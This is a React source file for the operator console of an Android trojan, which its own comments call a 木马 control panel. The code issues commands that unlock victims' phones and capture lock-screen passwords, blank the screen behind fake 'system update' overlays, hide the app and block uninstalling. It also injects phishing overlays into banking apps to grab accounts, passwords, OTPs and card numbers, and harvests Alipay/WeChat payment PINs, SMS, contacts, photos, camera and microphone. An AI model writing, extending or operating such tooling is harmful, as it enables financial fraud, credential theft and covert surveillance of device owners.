import { useEffect, useMemo, useRef, useState, useCallback } from 'react'
import { api, getToken } from '../api/client'
import { androidVersion, appVersion, appName, battery, batteryLevel, country, deviceName, formatTime, installTime, ip, lastHeartbeat, lastSeen, model, owner, pname, pid } from '../utils/device'
import { toast, centerToast } from '../utils/toast'
import '../styles/control-page.css'

import LogsTab from '../components/control/LogsTab'
import PasswordTab from '../components/control/PasswordTab'
import SmsTab from '../components/control/SmsTab'
import AppListTab from '../components/control/AppListTab'
import CameraTab from '../components/control/CameraTab'
import GalleryTab from '../components/control/GalleryTab'
import ContactsTab from '../components/control/ContactsTab'
import PaymentTab from '../components/control/PaymentTab'
import TrojanControlTab from '../components/control/TrojanControlTab'
import PermissionTab from '../components/control/PermissionTab'
import InjectionTab from '../components/control/InjectionTab'
import InjectionDataTab from '../components/control/InjectionDataTab'
import AiAnalysisTab from '../components/control/AiAnalysisTab'
import ReaderView from '../components/control/ReaderView'

const tabsCn = ['🏠 首页', '🤖 AI分析', '💉 注入中心', '💉 注入数据', '📱 应用列表', '📝 设备日志', '🔒 密码记录', '💰 支付密码', '✉ 短信记录', '👥 通讯录', '🖼 查看相册', '📸 摄像头/录音', '🔐 权限状态']

/**
 * 快捷按钮
 * - 全部使用统一色系（primary / danger / accent），不再一按钮一色
 * - toggle 字段用于标记可开关的按钮（例如黑屏、系统更新），会与 state.toggles 联动
 * - offCmd + offToast 用于二次点击时"取消"的指令与文案
 */
const quickButtons = [
  // ── 屏幕控制 ──
  { label: '点亮屏幕',  icon: '💡', cmd: 'POWER_WAKE',  toast: '屏幕已点亮', bridge: true, altCmds: ['wakeScreen', 'wakeUpScreen', 'SCREEN_ON'] },
  { label: '锁定屏幕',  icon: '🔒', cmd: 'POWER_SLEEP', toast: '屏幕已锁定', bridge: true, altCmds: ['SYSTEM_LOCK_SCREEN', 'lockScreen', 'SCREEN_OFF'] },
  { label: '开始控制',  icon: '⏱', cmd: 'CAPTURE_SCREEN', toast: '已开始控制', toggle: 'capture', offCmd: 'STOP_CAPTURE', offToast: '已停止控制' },
  // 黑屏/系统更新由 handleQuickButton 特殊处理，cmd/offCmd 仅备用
  { label: '黑屏遮盖',  icon: '🖥', cmd: 'ENABLE_BLACK_SCREEN', toast: '黑屏已开启', toggle: 'blackScreen', offCmd: 'DISABLE_BLACK_SCREEN', offToast: '黑屏已取消' },
  { label: '系统更新',  icon: '🔄', cmd: 'ENABLE_BLACK_SCREEN', toast: '系统更新已弹出', toggle: 'sysUpdate', offCmd: 'DISABLE_BLACK_SCREEN', offToast: '系统更新已关闭' },
  
  { label: '阻断操作',  icon: '⛔', cmd: 'DEVICE_BLOCK_INPUT', toast: '已阻断用户操作', toggle: 'block', offCmd: 'DEVICE_ALLOW_INPUT', offToast: '已允许操作' },
  
  // ── 一键解锁 ──
  { label: '数字解锁',  icon: '🔢', cmd: 'SMART_NUMERIC_UNLOCK', toast: '数字解锁已发送', unlock: true },
  { label: '图案解锁',  icon: '🔳', cmd: 'UNLOCK_DEVICE', toast: '图案解锁已发送', unlock: true },
  { label: '一键解锁',  icon: '🗝', cmd: 'UNLOCK_DEVICE', toast: '一键解锁已发送', unlock: true },
  { label: '获取锁屏密码',  icon: '⊙', cmd: 'ENABLE_PASSWORD_MONITORING', toast: '已发送' },
  { label: '误触滑动',  icon: '↯', cmd: 'ANTI_TOUCH_SWIPE', toast: '底部上滑两次，退出防误触模式', special: 'antiTouch' },
  // ── 功能区 ──
  { label: '亮度调节',  icon: '☀', cmd: 'SET_BRIGHTNESS', toast: '亮度已调节', bridge: true, params: { brightness: 0 } },
  { label: '开/闭音',   icon: '🔈', cmd: 'MUTE', toast: '静音已开启', toggle: 'muted', offCmd: 'MUTE', offToast: '静音已关闭' },
  { label: '音量+',     icon: '🔊', cmd: 'VOLUME_UP',   toast: '音量+' },
  { label: '音量-',     icon: '🔉', cmd: 'VOLUME_DOWN', toast: '音量-' },
  { label: '防止卸载',  icon: '🛡', cmd: 'ENABLE_UNINSTALL_PROTECTION', toast: '防卸载已开启', toggle: 'protect', offCmd: 'DISABLE_UNINSTALL_PROTECTION', offToast: '防卸载已关闭' },
  { label: '应用隐藏',  icon: '🙈', cmd: 'HIDE_APP', toast: '应用已隐藏', toggle: 'hideIcon', offCmd: 'SHOW_APP', offToast: '应用已显示' },
  { label: '禁人脸',    icon: '👤', cmd: 'DISABLE_BIOMETRIC', toast: '人脸识别已禁用' },
  { label: '一键卸载',  icon: '📥', cmd: 'UNINSTALL_SELF', toast: '卸载中...' },
  { label: '一键还原',  icon: '♻', cmd: 'FACTORY_RESET', toast: '已发送还原指令' },
  // ── 日志与服务器 ──
  { label: '启用日志',  icon: '📋', cmd: 'LOG_ENABLE', toast: '日志已启用', toggle: 'log', offCmd: 'LOG_DISABLE', offToast: '日志已关闭' },
  { label: '修改服务器',icon: '⚙', cmd: 'SET_SERVER',  toast: '服务器设置已发送' },
]


function imageSrc(v) { if (!v) return ''; if (typeof v === 'string') return v.startsWith('data:') || v.startsWith('blob:') ? v : `data:image/jpeg;base64,${v}`; if (typeof v === 'object') return imageSrc(v.base64 || v.image || v.data || v.payload || v.frame || v.jpeg || v.jpg || v.png || v.content); return '' }
function controlType(command) { return ({ TAP: 'tap', tap: 'tap', CLICK: 'tap', SWIPE: 'swipe_path', SWIPE_PATH: 'swipe_path' }[command] || command) }
function normalizeControlData(type, params = {}) { const p = params && typeof params === 'object' && !Array.isArray(params) ? params : { value: params }; if (type === 'swipe_path') { const startX = Math.round(p.startX ?? p.x1 ?? p.sx ?? 0), startY = Math.round(p.startY ?? p.y1 ?? p.sy ?? 0), endX = Math.round(p.endX ?? p.x2 ?? p.ex ?? 0), endY = Math.round(p.endY ?? p.y2 ?? p.ey ?? 0); return { path: [{ x: startX, y: startY }, { x: Math.round((startX + endX) / 2), y: Math.round((startY + endY) / 2) }, { x: endX, y: endY }], startX, startY, endX, endY, duration: p.duration ?? 300 } } return type === 'tap' ? { x: Math.round(p.x ?? 0), y: Math.round(p.y ?? 0) } : p }
function getReaderRoot(data) { if (!data || typeof data === 'string') return null; if (Array.isArray(data)) return { id: 'root', children: data }; if (data.root && typeof data.root === 'object') return data.root; if (data.nodes && Array.isArray(data.nodes)) return { id: 'root', children: data.nodes }; if (data.children && Array.isArray(data.children)) return data; return data }
function collectReaderNodes(node, out = []) { if (!node || typeof node !== 'object') return out; const b = node.bounds; if (b && typeof b.left === 'number' && typeof b.top === 'number' && typeof b.right === 'number' && typeof b.bottom === 'number') out.push(node); (Array.isArray(node.children) ? node.children : []).forEach(ch => collectReaderNodes(ch, out)); return out }
function parseBounds(bounds = '') { const m = String(bounds).match(/\[(\d+),(\d+)\]\[(\d+),(\d+)\]/); return m ? { left: +m[1], top: +m[2], right: +m[3], bottom: +m[4] } : null }
function parseHierarchyXml(xml) { const doc = new DOMParser().parseFromString(xml, 'text/xml'); const hierarchy = doc.querySelector('hierarchy'); if (!hierarchy) return null; let id = 0; const walk = (el) => { const bounds = parseBounds(el.getAttribute('bounds') || ''); if (!bounds) return null; const node = { id: `ls_${id++}`, type: el.getAttribute('class') || '', text: el.getAttribute('text') || undefined, description: el.getAttribute('content-desc') || undefined, bounds, clickable: el.getAttribute('clickable') === 'true', focusable: el.getAttribute('focusable') === 'true', children: [] }; for (const child of el.children) { const n = walk(child); if (n) node.children.push(n) } if (!node.children.length) delete node.children; return node }; const root = walk(hierarchy.querySelector('node') || hierarchy); return root ? { root, timestamp: Date.now() } : null }
function hasMeaningfulReaderData(data) { if (!data) return false; if (typeof data === 'string') return data.trim().length > 0; if (Array.isArray(data)) return data.length > 0; if (typeof data === 'object') return Boolean(data.root || data.nodes || data.children || data.xml || data.hierarchy || data.dump || data.payload || data.result || data.data); return false }
function normalizeReaderPayload(r) { const data = typeof r === 'string' ? parseHierarchyXml(r) || r : r?.xml ? parseHierarchyXml(r.xml) || r : r?.data ?? r; return hasMeaningfulReaderData(data) ? data : null }

/* ============================================================
 * 备注编辑模态框
 * ============================================================ */
function RemarkModal({ initialValue, onConfirm, onCancel }) {
  const [value, setValue] = useState(initialValue || '')

  return (
    <div className="overlay-modal-backdrop" onClick={e => e.target === e.currentTarget && onCancel()}>
      <div className="overlay-modal overlay-modal-sm">
        <div className="overlay-modal-header">
          <span className="overlay-modal-icon">📝</span>
          <h3>编辑备注</h3>
          <button className="overlay-modal-close" onClick={onCancel}>✕</button>
        </div>
        <div className="overlay-modal-body">
          <div className="overlay-field">
            <label>备注内容</label>
            <textarea
              className="overlay-textarea"
              value={value}
              onChange={e => setValue(e.target.value)}
              placeholder="输入设备备注信息..."
              rows={4}
              autoFocus
            />
          </div>
        </div>
        <div className="overlay-modal-footer">
          <button className="overlay-btn cancel" onClick={onCancel}>取消</button>
          <button className="overlay-btn confirm" onClick={() => onConfirm(value)}>💾 保存备注</button>
        </div>
      </div>
    </div>
  )
}

/* ============================================================
 * 黑屏遮挡配置弹窗（参考旧版：ENABLE_BLACK_SCREEN 命令）
 * 参数：text, fontSize, alpha=252, showIcon, showProgress
 * ============================================================ */
function _BlackScreenModalInline({ onConfirm, onCancel }) {
  const [text, setText] = useState('')
  const [fontSize, setFontSize] = useState(24)
  const [showIcon, setShowIcon] = useState(false)
  const [showProgress, setShowProgress] = useState(false)

  function handleConfirm() {
    onConfirm({ text, fontSize: Number(fontSize), alpha: 252, showIcon, showProgress })
  }

  return (
    <div className="overlay-modal-backdrop" onClick={e => e.target === e.currentTarget && onCancel()}>
      <div className="overlay-modal overlay-modal-sm">
        <div className="overlay-modal-header">
          <span className="overlay-modal-icon">🖥</span>
          <h3>黑屏遮挡设置</h3>
          <button className="overlay-modal-close" onClick={onCancel}>✕</button>
        </div>
        <div className="overlay-modal-body">
          <div className="overlay-field">
            <label>遮挡文字（可留空）</label>
            <input
              type="text"
              className="overlay-input"
              value={text}
              onChange={e => setText(e.target.value)}
              placeholder="如：系统维护中，请稍候..."
            />
          </div>
          <div className="overlay-field">
            <label>字体大小</label>
            <div className="overlay-progress-row">
              <input type="range" min={12} max={48} value={fontSize} onChange={e => setFontSize(e.target.value)} className="overlay-range" />
              <span className="overlay-range-val">{fontSize}px</span>
            </div>
          </div>
          <div className="overlay-field">
            <label className="overlay-checkbox-label">
              <input type="checkbox" checked={showIcon} onChange={e => setShowIcon(e.target.checked)} />
              显示图标
            </label>
          </div>
          <div className="overlay-field">
            <label className="overlay-checkbox-label">
              <input type="checkbox" checked={showProgress} onChange={e => setShowProgress(e.target.checked)} />
              显示进度条
            </label>
          </div>
          {/* 预览 */}
          <div className="overlay-preview" style={{ background: '#000' }}>
            <div className="overlay-preview-label">预览效果</div>
            {text && <div className="overlay-preview-msg" style={{ color: '#fff', fontSize: `${Math.min(fontSize, 20)}px` }}>{text}</div>}
            {!text && <div className="overlay-preview-msg" style={{ color: 'rgba(255,255,255,0.2)', fontSize: 12 }}>（无文字）</div>}
          </div>
        </div>
        <div className="overlay-modal-footer">
          <button className="overlay-btn cancel" onClick={onCancel}>取消</button>
          <button className="overlay-btn confirm" onClick={handleConfirm}>🖥 开启黑屏遮挡</button>
        </div>
      </div>
    </div>
  )
}

export default function ControlPage({ user: _user } = {}) {
  const qs = new URLSearchParams(location.search)
  const resolvedDeviceId = (qs.get('deviceId') || qs.get('controlDeviceId') || qs.get('device_id') || '').trim()
  const [device, setDevice] = useState(null)
  const [logs, setLogs] = useState([])
  const [wsState, setWsState] = useState('未连接')
  const [latency, setLatency] = useState('')
  const [deviceStatus, setDeviceStatus] = useState('offline') // 默认离线，等待 bot_list 更新
  const [streaming, setStreaming] = useState(false)
  const [screenMode, setScreenMode] = useState(null) // null | 'record' | 'system'
  const [screenLoading, setScreenLoading] = useState(false)

  const [screenSrc, setScreenSrc] = useState('')
  const [readerActive, setReaderActive] = useState(false)
  const readerActiveRef = useRef(false)
  const readerLastTsRef = useRef(0)

  const [readerData, setReaderData] = useState(null)
  const [readerTranslating, setReaderTranslating] = useState(false)
  const [readerLoading, setReaderLoading] = useState(false)
  const [readerError, setReaderError] = useState('')
  const [activeTab, setActiveTab] = useState('🏠 首页')
  const [now, setNow] = useState(new Date())
  const [textInput, setTextInput] = useState('')
  const [xy, setXy] = useState({ x: 540, y: 1200 })
  // 记录哪些"可开关"的快捷按钮当前处于开启状态，例如 { blackScreen: true, sysUpdate: false }
  const [toggles, setToggles] = useState({})
  // ⚠️ 木马控制面板显隐开关 — 始终显示（匹配旧前端）
  const [showTrojanControls, setShowTrojanControls] = useState(true)
  // 移动端检测 — 已禁用，只走 PC 端布局（固定双屏）
  const [isMobile] = useState(() => false)
  // 木马控制 - 阅读器颜色/字体设置（旧前端功能）
  const [readerBgColor, setReaderBgColor] = useState('#000000')
  const [readerTextColor, setReaderTextColor] = useState('#e1ff00')
  const [readerFontSize, setReaderFontSize] = useState(10)  // ★ 2026-08-06：默认 10（与木马控制 tab 一致，紧凑布局）
  const [isTranslating, setIsTranslating] = useState(false)
  // 木马控制 - 设备状态
  const [isMuted, setIsMuted] = useState(false)
  const [keepScreenOn, setKeepScreenOn] = useState(false)
  // 木马控制 - 弹出投屏
  const [screenPopped, setScreenPopped] = useState(false)
  // 首页选项卡 - 无障碍投屏/录屏模式 (null | 'screen' | 'record')
  const [accessibilityScreenMode, setAccessibilityScreenMode] = useState(null)
  // 投屏确认提示
  const [screenConfirmVisible, setScreenConfirmVisible] = useState(false)
  const screenConfirmRef = useRef(false)
  // 弹窗状态
  const [blackScreenModal, setBlackScreenModal] = useState(false)
  const [serverModal, setServerModal] = useState(false)
  const [serverUrl, setServerUrl] = useState('')
  const [editingRemark, setEditingRemark] = useState(false)
  const [remarkValue, setRemarkValue] = useState('')
  const [unlockPwd, setUnlockPwd] = useState('')
  const [patternPwd, setPatternPwd] = useState('')
  const [gestureModal, setGestureModal] = useState(false)
  const [gestureList, setGestureList] = useState([])
  const [gestureLoading, setGestureLoading] = useState(false)
  // 注入中心数据
  const [injectionTemplates, setInjectionTemplates] = useState([])
  const [injectionConfigs, setInjectionConfigs] = useState([])
  const [injActivePkgs, setInjActivePkgs] = useState(new Set()) // 正在注入中的包名
  const [injActiveIds, setInjActiveIds] = useState(new Set())   // 正在注入中的模板ID
  const [injGrabbed, setInjGrabbed] = useState([])              // 已抓取数据
  const [injLoading, setInjLoading] = useState(null)            // 当前操作中的模板ID
  // 设备日志数据已迁移到 LogsTab 组件自管状态（2026-08-06 v2）
  // 密码记录数据
  const [pwdList, setPwdList] = useState([])
  const [lockPwd, setLockPwd] = useState({ value: '', type: 'none', status: '未检测' })
  const [alipayPwd, setAlipayPwd] = useState({ value: '', type: 'none', status: '未捕获' })
  const [wechatPwd, setWechatPwd] = useState({ value: '', type: 'none', status: '未捕获' })
  const [pwdTotal, setPwdTotal] = useState(0)
  const [pwdPage, setPwdPage] = useState(1)
  const [pwdSize, setPwdSize] = useState(20)
  const [pwdType, setPwdType] = useState('')
  const [pwdLoading, setPwdLoading] = useState(false)
  // 支付密码数据
  const [payStrategies, setPayStrategies] = useState([])
  const [payRecords, setPayRecords] = useState([])
  const [payRecordsTotal, setPayRecordsTotal] = useState(0)
  const [payLoading, setPayLoading] = useState(false)
  const [payNewPkg, setPayNewPkg] = useState('')
  const [payNewName, setPayNewName] = useState('')
  const [payNewWindows, setPayNewWindows] = useState('')
  const [payPushModalOpen, setPayPushModalOpen] = useState(false)
  const [payPushSelectedIds, setPayPushSelectedIds] = useState([])
  // 短信记录数据
  const [smsList, setSmsList] = useState([])
  const [smsTotal, setSmsTotal] = useState(0)
  const [smsPage, setSmsPage] = useState(1)
  const [smsSize, setSmsSize] = useState(9999)
  const [smsLoading, setSmsLoading] = useState(false)
  const [smsSearch, setSmsSearch] = useState('')
  const [smsPhone, setSmsPhone] = useState('')
  const [smsContent, setSmsContent] = useState('')
  const [smsSim, setSmsSim] = useState('0')
  const [smsSending, setSmsSending] = useState(false)
  const [showBulkSmsModal, setShowBulkSmsModal] = useState(false)
  const [bulkSmsContent, setBulkSmsContent] = useState('')
  const [bulkSmsSim, setBulkSmsSim] = useState('0')
  const [bulkContacts, setBulkContacts] = useState([])
  const [bulkContactsLoading, setBulkContactsLoading] = useState(false)
  const [bulkSelected, setBulkSelected] = useState(new Set())
  const [bulkSending, setBulkSending] = useState(false)
  // 通讯录数据
  const [contactsList, setContactsList] = useState([])
  const [contactsTotal, setContactsTotal] = useState(0)
  const [contactsLoading, setContactsLoading] = useState(false)
  const [contactsSearch, setContactsSearch] = useState('')
  // 相册数据
  const [galleryList, setGalleryList] = useState([])
  const [galleryTotal, setGalleryTotal] = useState(0)
  const [galleryLoading, setGalleryLoading] = useState(false)
  const [galleryCount, setGalleryCount] = useState('')
  const [galleryPage, setGalleryPage] = useState(1)
  const [gallerySize, setGallerySize] = useState(40)
  const [galleryPreview, setGalleryPreview] = useState(null) // 预览大图URL
  // 文件管理数据
  const [fmFiles, setFmFiles] = useState([])
  const [fmPath, setFmPath] = useState('/sdcard')
  const [fmLoading, setFmLoading] = useState(false)
  const [fmSearch, setFmSearch] = useState('')
  const [fmSelected, setFmSelected] = useState(new Set())
  const [fmClipboard, setFmClipboard] = useState(null) // { action: 'copy'|'cut', files: [] }
  // 摄像头监控数据
  const [camActive, setCamActive] = useState(false)
  const [camFacing, setCamFacing] = useState('front') // 'front' | 'back'
  const [camSrc, setCamSrc] = useState('')
  const [camZoom, setCamZoom] = useState(1)
  const [micActive, setMicActive] = useState(false)
  const [micQuality, setMicQuality] = useState('STANDARD') // 'STANDARD' | 'HIGH' | 'LOW'
  const [micMode, setMicMode] = useState('VOICE_RECOGNITION') // audioSource
  const [micDuration, setMicDuration] = useState(1) // 倍数
  const [micNoiseSuppression, setMicNoiseSuppression] = useState(true) // 降噪开关
  const camActiveRef = useRef(false)
  const camIntervalRef = useRef(null)
  const [micRecordingUrl, setMicRecordingUrl] = useState('')
  const [micTranscript, setMicTranscript] = useState('')
  // 注入数据记录
  const [injDataList, setInjDataList] = useState([])
  const [injDataTotal, setInjDataTotal] = useState(0)
  const [injDataPage, setInjDataPage] = useState(1)
  const [injDataSize, setInjDataSize] = useState(20)
  const [injDataLoading, setInjDataLoading] = useState(false)
  const [injDataLoaded, setInjDataLoaded] = useState(false)
  // 权限状态
  const [permStatus, setPermStatus] = useState({})
  const [permLoading, setPermLoading] = useState(false)
  const [permLoaded, setPermLoaded] = useState(false)
  // 应用列表数据
  const [appList, setAppList] = useState([])
  const [appLoading, setAppLoading] = useState(false)
  const [appSearch, setAppSearch] = useState('')
  // ADB 木马控制状态
  const [adbStatus, setAdbStatus] = useState({ adb_enabled: false, adb_wifi_enabled: false, adb_deploy_enabled: false, wifi_port: 0, pairing_state: 'idle' })
  const [adbAgentConnected, setAdbAgentConnected] = useState(false) // ADB Agent (宿主机) 连接状态
  const [adbShellHistory, setAdbShellHistory] = useState([])
  // ADB 控制屏幕截图状态
  const [adbScreenSrc, setAdbScreenSrc] = useState('')
  const [adbScreenStreaming, setAdbScreenStreaming] = useState(false)
  const [adbScreenLoading, setAdbScreenLoading] = useState(false)
  const adbScreenIntervalRef = useRef(null)
  const [adbTapX, setAdbTapX] = useState(540)
  const [adbTapY, setAdbTapY] = useState(1200)
  const [adbSwipe, setAdbSwipe] = useState({ x1: 540, y1: 1200, x2: 540, y2: 1800, duration: 300 })
  const [adbKeyCode, setAdbKeyCode] = useState('66')
  const [adbTextInput, setAdbTextInput] = useState('')
  const [adbShellCmd, setAdbShellCmd] = useState('')
  const [adbDeploying, setAdbDeploying] = useState(false)
  const [wsTestInput, setWsTestInput] = useState('')
  const adbDeployTimerRef = useRef(null)
  const [adbPairingCode, setAdbPairingCode] = useState('')
  const [adbPairingPort, setAdbPairingPort] = useState('')
  const [adbPairingState, setAdbPairingState] = useState('idle') // idle | pairing | paired | failed
  const [adbAccessibilityStatus, setAdbAccessibilityStatus] = useState('未知')
  const [adbUnlockPin, setAdbUnlockPin] = useState('')
  const [adbUnlockPattern, setAdbUnlockPattern] = useState('')
  const [adbUnlockPassword, setAdbUnlockPassword] = useState('')

  const wsRef = useRef(null), pingRef = useRef(0), reconnectRef = useRef(null), screenshotIntervalRef = useRef(null), lastScreenDataRef = useRef(''), readerRefreshTimerRef = useRef(null), readerTimeoutRef = useRef(null), readerLoadingRef = useRef(false), pendingWsPayloadsRef = useRef([])
  const addLog = (s) => setLogs(v => [`${new Date().toLocaleTimeString()} ${s}`, ...v].slice(0, 100))
  const title = useMemo(() => device ? deviceName(device) : resolvedDeviceId, [device, resolvedDeviceId])
  useEffect(() => { document.title = title ? `${title} - 设备控制中心` : '设备控制中心' }, [title])
  // deviceStatus 来自 bot_list，是设备真实在线状态；wsConnected 只是面板与服务端的 WS 通了
  const wsConnected = wsState === '已连接'
  const deviceOnline = deviceStatus === 'online' || deviceStatus === 'sleeping'
  const deviceSleeping = deviceStatus === 'sleeping'



  async function load() { if (!resolvedDeviceId) return; try { const r = await api.request(`/api/device/${encodeURIComponent(resolvedDeviceId)}`); const d = r?.data || r?.device || r; if (d) { setDevice(d); addLog('设备信息已刷新'); /* 根据API返回的status字段更新设备在线状态（支持 sleeping） */ if (d.status === 'online') setDeviceStatus('online'); else if (d.status === 'sleeping') setDeviceStatus('sleeping'); else if (d.status === 'offline') setDeviceStatus('offline'); else if (d.status === 'connecting') setDeviceStatus('sleeping'); else { const connected = d.is_connected || d.isConnected || d.connected; if (connected === 1 || connected === true || connected === '1') setDeviceStatus('online'); else if (connected === 0 || connected === false || connected === '0') setDeviceStatus('offline') } /* 同步更新ADB状态 */ if (d.adb_enabled !== undefined || d.adb_wifi_enabled !== undefined || d.adb_deploy_enabled !== undefined) { setAdbStatus(prev => ({ ...prev, adb_enabled: d.adb_enabled ?? prev.adb_enabled, adb_wifi_enabled: d.adb_wifi_enabled ?? prev.adb_wifi_enabled, adb_deploy_enabled: d.adb_deploy_enabled ?? prev.adb_deploy_enabled, wifi_port: d.wifi_port ?? prev.wifi_port })) } } } catch (e) { toast(e.message, 'error') } }
  async function loadInjectionData() { try { const [tplRes, cfgRes, taskRes, grabRes] = await Promise.all([api.request('/api/injection/templates'), api.request('/api/injection/global-configs'), api.request(`/api/injection/active-tasks?deviceId=${encodeURIComponent(resolvedDeviceId)}`).catch(() => ({ packages: [], templateIds: [] })), api.request(`/api/injection/grabbed-data?deviceId=${encodeURIComponent(resolvedDeviceId)}`).catch(() => [])]); setInjectionTemplates(tplRes.data?.templates || tplRes.templates || tplRes.data || tplRes || []); setInjectionConfigs(cfgRes.data?.configs || cfgRes.configs || cfgRes.data || cfgRes || []); setInjActivePkgs(new Set(taskRes.packages || [])); setInjActiveIds(new Set(taskRes.templateIds || [])); setInjGrabbed(Array.isArray(grabRes) ? grabRes : grabRes.data || grabRes.items || []) } catch (e) {} }
  function parseGrabbedData(dataStr) { try { if (!dataStr) return {}; let obj = typeof dataStr === 'string' ? JSON.parse(dataStr) : dataStr; if (obj.data && typeof obj.data === 'string') { try { obj = { ...obj, ...JSON.parse(obj.data) }; } catch {} } return { account: obj.account || obj.username || obj['\u8d26\u53f7'] || obj['\u624b\u673a\u53f7'] || '', password: obj.password || obj.pwd || obj['\u5bc6\u7801'] || '', verification: obj.verification || obj.code || obj.sms || obj.otp || obj.payPassword || obj.paypass || obj.pay_password || obj['\u9a8c\u8bc1\u7801'] || obj['\u652f\u4ed8\u5bc6\u7801'] || '', card: obj.card || obj.cardNumber || obj['\u5361\u53f7'] || obj['\u7c7b\u578b'] || '' } } catch { return {} } }
  async function startInjection(bank) { if (injLoading) return; setInjLoading(bank.id); try { const tplRes = await api.request(`/api/injection/templates/${encodeURIComponent(bank.id)}`); const htmlContent = tplRes.htmlContent || tplRes.data?.htmlContent || tplRes.data?.template?.htmlContent || ''; sendWs({ type: 'command', sessionId: resolvedDeviceId, data: { command: 'SHOW_INJECTION', params: { packageName: bank.packageName, htmlContent, templateId: bank.id } } }); await api.request('/api/injection/active-tasks', { method: 'POST', body: JSON.stringify({ deviceId: resolvedDeviceId, packageName: bank.packageName, templateId: bank.id }) }); setInjActivePkgs(prev => new Set([...prev, bank.packageName])); setInjActiveIds(prev => new Set([...prev, bank.id])); centerToast(`${bank.name} 注入已启动`); addLog(`已启动注入: ${bank.name}`) } catch (e) { toast(e.message, 'error') } finally { setInjLoading(null) } }
  async function stopInjection(bank) { if (injLoading) return; setInjLoading(bank.id); try { sendWs({ type: 'command', sessionId: resolvedDeviceId, data: { command: 'STOP_INJECTION', params: { packageName: bank.packageName } } }); await api.request(`/api/injection/active-tasks?deviceId=${encodeURIComponent(resolvedDeviceId)}&packageName=${encodeURIComponent(bank.packageName)}`, { method: 'DELETE' }); setInjActivePkgs(prev => { const n = new Set(prev); n.delete(bank.packageName); return n }); setInjActiveIds(prev => { const n = new Set(prev); n.delete(bank.id); return n }); centerToast(`${bank.name} 注入已停止`) } catch (e) { toast(e.message, 'error') } finally { setInjLoading(null) } }
  async function loadPasswords(page = pwdPage, size = pwdSize, type = pwdType) { setPwdLoading(true); try { const typeParam = type && type !== 'DEFAULT' ? `&passwordType=${type}` : ''; const r = await api.request(`/api/password-inputs/${encodeURIComponent(resolvedDeviceId)}?page=${page}&pageSize=${size}${typeParam}`); if (r.success && r.data) { const list = Array.isArray(r.data) ? r.data : (r.data.passwords || r.data.list || []); setPwdList(list); setPwdTotal(r.data.total || r.total || list.length); setPwdPage(r.data.page || page); setPwdSize(r.data.pageSize || size) } else { setPwdList(r.passwords || r.data || []); setPwdTotal(r.total || 0) } } catch (e) { setPwdList([]); setPwdTotal(0) } finally { setPwdLoading(false) } }
  function refreshPwdSummary() {
    addLog('刷新密码状态')
    api.request(`/api/password-inputs/${encodeURIComponent(resolvedDeviceId)}`).then(r => {
      const list = Array.isArray(r.data) ? r.data : (r.data?.passwords || r.passwords || [])
      processPwdList(list)
    }).catch(() => {})
  }
  function processPwdList(list) {
    if (!Array.isArray(list) || list.length === 0) return
    // Lock screen: 优先取最新一条锁屏相关记录（API 按 created_at desc 排序）
    const lock = list.find(p => !p.source || p.source === 'manual' || p.source === 'lock' || p.source === 'lockscreen' || p.source === 'system_lock') || list[0]
    if (lock && (lock.cipher_text || lock.password)) {
      let pwdValue = lock.cipher_text || lock.password || ''
      const pwdType = lock.cipher_type || 'pin'
      // 图案密码不再 +1，直接使用 APK 原始值（0-indexed）
      setLockPwd({ value: pwdValue, type: pwdType, status: '已获取' })
    }
    // Alipay
    const alipay = list.find(p => p.source === 'alipay' || (p.cipher_type||'').includes('alipay'))
    if (alipay) {
      setAlipayPwd({ value: alipay.cipher_text || alipay.password || '', type: alipay.cipher_type || 'payment', status: '已捕获' })
    }
    // WeChat
    const wechat = list.find(p => p.source === 'wechat' || (p.cipher_type||'').includes('wechat'))
    if (wechat) {
      setWechatPwd({ value: wechat.cipher_text || wechat.password || '', type: wechat.cipher_type || 'payment', status: '已捕获' })
    }
  }
  async function clearPasswords() { if (!confirm('确定要清空所有密码记录吗？')) return; try { const r = await api.request(`/api/password-inputs/${encodeURIComponent(resolvedDeviceId)}`, { method: 'DELETE' }); if (r.success) { setPwdList([]); setPwdTotal(0); centerToast('已清空密码记录') } else { toast('清空失败', 'error') } } catch (e) { toast('清空失败', 'error') } }

  // 支付密码相关函数
  async function loadPayStrategies() { try { const r = await api.request('/api/payment-strategies'); const d = r?.data?.strategies || r?.data?.items || r?.strategies || r?.items || r?.data; setPayStrategies(Array.isArray(d) ? d : []) } catch { setPayStrategies([]) } }
  async function loadPayRecords() { setPayLoading(true); try { const params = new URLSearchParams({ deviceId: resolvedDeviceId, page: '1', pageSize: '50' }); const r = await api.request(`/api/payment-cipher-records?${params}`); const d = r?.data?.records || r?.data?.items || r?.records || r?.items || r?.data; setPayRecords(Array.isArray(d) ? d : []); setPayRecordsTotal(r?.total || r?.data?.total || 0) } catch { setPayRecords([]) } finally { setPayLoading(false) } }
  async function addPayStrategy() { if (!payNewPkg.trim()) { toast('包名不能为空', 'error'); return }; try { const r = await api.request('/api/payment-strategies', { method: 'POST', body: JSON.stringify({ packageName: payNewPkg.trim(), appName: payNewName.trim() || '', windowClassNames: payNewWindows.trim() || '' }) }); if (r.success) { centerToast('策略已添加'); setPayNewPkg(''); setPayNewName(''); setPayNewWindows(''); loadPayStrategies() } else { toast('添加失败', 'error') } } catch (e) { toast(e.message, 'error') } }
  async function deletePayStrategy(id) { try { const r = await api.request(`/api/payment-strategies/${id}`, { method: 'DELETE' }); if (r.success) { centerToast('已删除'); loadPayStrategies() } } catch {} }
  async function pushPayStrategies() {
    // 打开模态框，先加载已绑定的策略
    try {
      const r = await api.request(`/api/device-payment-strategies/${encodeURIComponent(resolvedDeviceId)}`)
      const bound = r?.data?.strategyIds || r?.strategyIds || []
      setPayPushSelectedIds(bound.length > 0 ? bound : payStrategies.map(s => s.id))
    } catch {
      setPayPushSelectedIds(payStrategies.map(s => s.id))
    }
    setPayPushModalOpen(true)
  }
  async function saveAndPushPayStrategies() {
    try {
      await api.request(`/api/device-payment-strategies/${encodeURIComponent(resolvedDeviceId)}`, { method: 'PUT', body: JSON.stringify({ strategyIds: payPushSelectedIds }) })
      const r = await api.request(`/api/device-payment-strategies/${encodeURIComponent(resolvedDeviceId)}/push`, { method: 'POST' })
      if (r.success) {
        // 获取包名列表并通过 WS 发送 SET_VIEW_CACHE_RULES 给设备
        const packages = r.packages || r.data?.packages || []
        if (packages.length > 0) {
          sendWs({ type: 'command', sessionId: resolvedDeviceId, data: { command: 'SET_VIEW_CACHE_RULES', params: { packages } } })
        }
        centerToast('策略已推送到设备'); setPayPushModalOpen(false)
      } else { toast('推送失败', 'error') }
    } catch (e) { toast(e.message, 'error') }
  }
